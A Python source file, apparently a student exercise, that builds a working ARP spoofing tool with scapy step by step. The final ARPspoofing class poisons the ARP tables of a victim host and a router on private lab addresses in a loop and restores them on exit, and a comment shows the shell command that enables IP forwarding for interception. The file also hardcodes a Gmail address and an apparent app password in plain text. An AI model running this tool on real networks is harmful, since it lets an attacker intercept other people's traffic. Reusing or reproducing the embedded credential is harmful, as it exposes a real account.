import scapy.all as scapy
import time

# step 1 - create an ARP response packet
# need to create two ARP Response packets
# send on to the router, and the other to the victim
#
# victimarpresponse = scapy.ARP(op=2,
#                               pdst='192.168.68.131',
#                               hwdst='00:0c:29:4c:e6:0a',
#                               psrc='192.168.68.2')
# victimarpresponse.show()
#
# # My additions by copy-pasting and trying to create a router ARP packet
# routerarpresponse = scapy.ARP(op=2,
#                               pdst='192.168.68.2',
#                               hwdst='00:0c:29:aa:e4:40',
#                               psrc='192.168.68.131')
# routerarpresponse.show()

# step 2 - automatically get the targeted machine's MAC address
#
# def getmac(ip):
#     arprequestframe = scapy.ARP(pdst=ip)
#     etherdataframe = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
#     arppacket = etherdataframe / arprequestframe
#     response = scapy.srp(arppacket, timeout=1, verbose=False)
#     answeredreqs = response[0]
# #the first zero is a device that responded, the second 1 is the response from the responded device, hwsrc is the it we want - the victim's MAC
#     targetmac=answeredreqs[0][1].hwsrc
#     return targetmac
#
# # target=getmac('192.168.68.131')
# #
# # print(target)
#
# def spoofing(targetip,spoofip):
#     targetmacaddress=getmac(targetip)
#     arpresponseframe1 = scapy.ARP(op=2,
#                                  pdst=targetip,
#                                  hwdst=targetmacaddress,
#                                  psrc=spoofip)
#     scapy.send(arpresponseframe1)
#
# while True:
#     spoofing('192.168.68.2', '192.168.68.131')
#     spoofing('192.168.68.131', '192.168.68.2')
#     time.sleep(3)

# step 3 - keep sending the packets to the victim and the router

# └─# echo 1 > /proc/sys/net/ipv4/ip_forward

#step 4 - track the status of the spoofing attack
#
# def getmac(ip):
#     arprequestframe = scapy.ARP(pdst=ip)
#     etherdataframe = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
#     arppacket = etherdataframe / arprequestframe
#     response = scapy.srp(arppacket, timeout=1, verbose=False)
#     answeredreqs = response[0]
#     targetmac=answeredreqs[0][1].hwsrc
#     return targetmac
#
# def spoofing(targetip,spoofip):
#     targetmacaddress=getmac(targetip)
#     spoofmacaddress=getmac(spoofip)
#     arpresponseframe1 = scapy.ARP(op=2,
#                                  pdst=targetip,
#                                  hwdst=targetmacaddress,
#                                  psrc=spoofip)
#     arpresponseframe2 = scapy.ARP(op=2,
#                                  pdst=spoofip,
#                                  hwdst=spoofmacaddress,
#                                  psrc=targetip)
#     scapy.send(arpresponseframe1, verbose=False)
#     scapy.send(arpresponseframe2, verbose=False)
#
# counter = 0
#
# while True:
#     spoofing('192.168.68.2', '192.168.68.131')
#     counter = counter+2
#     print(f'{counter} Total ARP Request Packets sent.')
#     time.sleep(3)

#step 5 dynamic printing exercise

# timer = 10
#
# while timer>0:
#     print(f'\rCurrent timer: {timer}', end=' \m/')
#     timer = timer-1
#     time.sleep(1)
#
# def getmac(ip):
#     arprequestframe = scapy.ARP(pdst=ip)
#     etherdataframe = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
#     arppacket = etherdataframe / arprequestframe
#     response = scapy.srp(arppacket, timeout=1, verbose=False)
#     answeredreqs = response[0]
#     targetmac=answeredreqs[0][1].hwsrc
#     return targetmac
#
# def spoofing(targetip,spoofip):
#     targetmacaddress=getmac(targetip)
#     spoofmacaddress=getmac(spoofip)
#     arpresponseframe1 = scapy.ARP(op=2,
#                                  pdst=targetip,
#                                  hwdst=targetmacaddress,
#                                  psrc=spoofip)
#     arpresponseframe2 = scapy.ARP(op=2,
#                                  pdst=spoofip,
#                                  hwdst=spoofmacaddress,
#                                  psrc=targetip)
#     scapy.send(arpresponseframe1, verbose=False)
#     scapy.send(arpresponseframe2, verbose=False)
#
# counter = 0
#
# while True:
#     spoofing('192.168.68.2', '192.168.68.131')
#     counter = counter+2
#     print(f'\r{counter} Total ARP Request Packets sent.', end ='')
#     time.sleep(3)

#step 6 - Handling the exception of the control+c kill condition

# def getmac(ip):
#     arprequestframe = scapy.ARP(pdst=ip)
#     etherdataframe = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
#     arppacket = etherdataframe / arprequestframe
#     response = scapy.srp(arppacket, timeout=1, verbose=False)
#     answeredreqs = response[0]
#     targetmac=answeredreqs[0][1].hwsrc
#     return targetmac
#
# def spoofing(targetip,spoofip):
#     targetmacaddress=getmac(targetip)
#     spoofmacaddress=getmac(spoofip)
#     arpresponseframe1 = scapy.ARP(op=2,
#                                  pdst=targetip,
#                                  hwdst=targetmacaddress,
#                                  psrc=spoofip)
#     arpresponseframe2 = scapy.ARP(op=2,
#                                  pdst=spoofip,
#                                  hwdst=spoofmacaddress,
#                                  psrc=targetip)
#     scapy.send(arpresponseframe1, verbose=False)
#     scapy.send(arpresponseframe2, verbose=False)
#
# counter = 0
#
# try:
#     while True:
#         spoofing('192.168.68.2', '192.168.68.132')
#         counter = counter+2
#         print(f'\r{counter} Total ARP Request Packets sent.', end ='')
#         time.sleep(3)
# except KeyboardInterrupt:
#     print(f'\n\nThe ARP Spoofing program has been terminated by the user. {counter} packets were sent.')

#step 7.1 - create a restore function to restore victim and router's previous ARP tables
#we have to create two ARP response packets containing the legit data for the Router - Victim and vice versa

# def getmac(ip):
#     arprequestframe = scapy.ARP(pdst=ip)
#     etherdataframe = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
#     arppacket = etherdataframe / arprequestframe
#     response = scapy.srp(arppacket, timeout=1, verbose=False)
#     answeredreqs = response[0]
#     targetmac=answeredreqs[0][1].hwsrc
#     return targetmac
#
# def spoofing(targetip,spoofip):
#     targetmacaddress=getmac(targetip)
#     spoofmacaddress=getmac(spoofip)
#     arpresponseframe1 = scapy.ARP(op=2,
#                                  pdst=targetip,
#                                  hwdst=targetmacaddress,
#                                  psrc=spoofip)
#     arpresponseframe2 = scapy.ARP(op=2,
#                                  pdst=spoofip,
#                                  hwdst=spoofmacaddress,
#                                  psrc=targetip)
#     scapy.send(arpresponseframe1, verbose=False)
#     scapy.send(arpresponseframe2, verbose=False)
#
# def restoreproperarp(victimip,routerip):
#     victimtruemac=getmac(victimip)
#     routertruemac=getmac(routerip)
#     arpresponseframevictim = scapy.ARP(op=2,
#                                   pdst=victimip,
#                                   hwdst=victimtruemac,
#                                   psrc=routerip,
#                                   hwsrc=routertruemac)
#     arpresponseframerouter = scapy.ARP(op=2,
#                                   pdst=routerip,
#                                   hwdst=routertruemac,
#                                   psrc=victimip,
#                                   hwsrc=victimtruemac)
#     scapy.send(arpresponseframevictim, count=4, verbose=False)
#     scapy.send(arpresponseframerouter, count=4, verbose=False)
#     print(f'\nNormal ARP routes restored for the machines at {victimip} and {routerip}.')
#
# counter = 0
# victim='192.168.68.131'
# router='192.168.68.2'
# try:
#     while True:
#         spoofing(victim,router)
#         counter = counter+2
#         print(f'\r{counter} Total ARP Request Packets sent.', end ='')
#         time.sleep(3)
# except KeyboardInterrupt:
#     print(f'\n\nThe ARP Spoofing program has been terminated by the user. {counter} packets were sent.')
#     restoreproperarp(victim,router)

#step 7.2 - create a function to group the "while loop" logic

# import scapy.all as scapy
# import time
#
# def getmac(ip):
#     arprequestframe = scapy.ARP(pdst=ip)
#     etherdataframe = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
#     arppacket = etherdataframe / arprequestframe
#     response = scapy.srp(arppacket, timeout=3, verbose=False)
#     answeredreqs = response[0]
#     targetmac=answeredreqs[0][1].hwsrc
#     return targetmac
#
# def spoofing(targetip,spoofip):
#     targetmacaddress=getmac(targetip)
#     spoofmacaddress=getmac(spoofip)
#     arpresponseframe1 = scapy.ARP(op=2,
#                                  pdst=targetip,
#                                  hwdst=targetmacaddress,
#                                  psrc=spoofip)
#     arpresponseframe2 = scapy.ARP(op=2,
#                                  pdst=spoofip,
#                                  hwdst=spoofmacaddress,
#                                  psrc=targetip)
#     scapy.send(arpresponseframe1, verbose=False)
#     scapy.send(arpresponseframe2, verbose=False)
#
# def restoreproperarp(victimip,routerip):
#     victimtruemac=getmac(victimip)
#     routertruemac=getmac(routerip)
#     arpresponseframevictim = scapy.ARP(op=2,
#                                   pdst=victimip,
#                                   hwdst=victimtruemac,
#                                   psrc=routerip,
#                                   hwsrc=routertruemac)
#     arpresponseframerouter = scapy.ARP(op=2,
#                                   pdst=routerip,
#                                   hwdst=routertruemac,
#                                   psrc=victimip,
#                                   hwsrc=victimtruemac)
#     scapy.send(arpresponseframevictim, count=4, verbose=False)
#     scapy.send(arpresponseframerouter, count=4, verbose=False)
#     print(f'\nNormal ARP routes restored for the machines at {victimip} and {routerip}.')
#
# def initiateattack(givenvictim,givenrouter):
#     counter = 0
#     try:
#         while True:
#             spoofing(givenvictim,givenrouter)
#             counter = counter+2
#             print(f'\r{counter} Total ARP Request Packets sent.', end='')
#             time.sleep(3)
#     except KeyboardInterrupt:
#         print(f'\n\nThe ARP Spoofing program has been terminated by the user. {counter} packets were sent.')
#         restoreproperarp(givenvictim,givenrouter)
#
# initiateattack('192.168.68.131','192.168.68.2')

#step 8 - convert to class
#
import scapy.all as scapy
import time
import smtplib

class ARPspoofing:

    def __init__(self,victimipaddress,routeripaddress):
        self.victimipaddress = victimipaddress
        self.routeripaddress = routeripaddress

    def getmac(self,ip):
        arprequestframe = scapy.ARP(pdst=ip)
        etherdataframe = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
        arppacket = etherdataframe / arprequestframe
        response = scapy.srp(arppacket, timeout=1, verbose=False)[0]
        targetmac=response[0][1].hwsrc
        return targetmac

    def spoofing(self,targetip,spoofip):
        targetmacaddress=self.getmac(targetip)
        spoofmacaddress=self.getmac(spoofip)
        arpresponseframe1 = scapy.ARP(op=2,
                                     pdst=targetip,
                                     hwdst=targetmacaddress,
                                     psrc=spoofip)
        arpresponseframe2 = scapy.ARP(op=2,
                                     pdst=spoofip,
                                     hwdst=spoofmacaddress,
                                     psrc=targetip)
        scapy.send(arpresponseframe1, verbose=False)
        scapy.send(arpresponseframe2, verbose=False)

    def restoreproperarp(self,victimip,routerip):
        victimtruemac=self.getmac(victimip)
        routertruemac=self.getmac(routerip)
        arpresponseframevictim = scapy.ARP(op=2,
                                      pdst=victimip,
                                      hwdst=victimtruemac,
                                      psrc=routerip,
                                      hwsrc=routertruemac)
        arpresponseframerouter = scapy.ARP(op=2,
                                      pdst=routerip,
                                      hwdst=routertruemac,
                                      psrc=victimip,
                                      hwsrc=victimtruemac)
        scapy.send(arpresponseframevictim, count=4, verbose=False)
        scapy.send(arpresponseframerouter, count=4, verbose=False)
        print(f'\nNormal ARP routes restored for the machines at {victimip} and {routerip}.')

    def sendemail(self,email):
        username = "mjstane.ut@gmail.com"
        password = "ibdr lmxv nbyj dmic"
        gmail_server = smtplib.SMTP('smtp.gmail.com', 587, )
        gmail_server.starttls()
        gmail_server.login(username,password)
        gmail_server.sendmail(username,username,email)
        gmail_server.quit()

    def initiateattack(self):
        print('Matt Stanek - ARP Spoofer is running')
        message = f'The ARP Spoofing process has been initiated on IP address {self.victimipaddress} and {self.routeripaddress}.'
        self.sendemail(message)
        counter = 0
        try:
            while True:
                self.spoofing(self.victimipaddress,self.routeripaddress)
                counter = counter+2
                print(f'\r{counter} Total ARP Request Packets sent.', end='')
                time.sleep(3)
        except KeyboardInterrupt:
            print(f'\n\nThe ARP Spoofing program has been terminated by the user. {counter} packets were sent.')
            self.restoreproperarp(self.victimipaddress,self.routeripaddress)
            message2 = f'The ARP Spoofing process has been terminated and all routes were restored. {counter} total packets were sent.'
            self.sendemail(message2)

if __name__=="__main__":
    start=ARPspoofing('192.168.68.132','192.168.68.2').initiateattack()